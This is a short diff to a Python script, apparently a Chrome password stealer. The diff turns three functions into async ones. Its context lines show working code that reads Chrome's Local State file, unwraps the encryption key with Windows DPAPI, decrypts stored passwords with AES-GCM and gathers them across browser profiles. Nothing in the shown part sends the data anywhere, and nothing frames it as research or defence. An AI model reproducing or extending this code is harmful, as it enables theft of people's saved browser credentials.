@@ -6,7 +6,7 @@ from Cryptodome.Cipher import AES
 import sqlite3
 import shutil
 
-def get_encryption_key():
+async def get_encryption_key():
     local_state_path = os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Local State"
     with open(local_state_path, "r", encoding="utf-8") as file:
         local_state = json.load(file)
@@ -14,7 +14,7 @@ def get_encryption_key():
     decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
     return decrypted_key
 
-def decrypt_password(encrypted_password, key):
+async def decrypt_password(encrypted_password, key):
     try:
         nonce, ciphertext, tag = encrypted_password[:12], encrypted_password[12:-16], encrypted_password[-16:]
         cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
@@ -24,7 +24,7 @@ def decrypt_password(encrypted_password, key):
 
 passwd_list = {}
 
-def get_chrome_passwords():
+async def get_chrome_passwords():
     base_path = os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data"
     profiles = ["default"]  # Incluir "default"
     
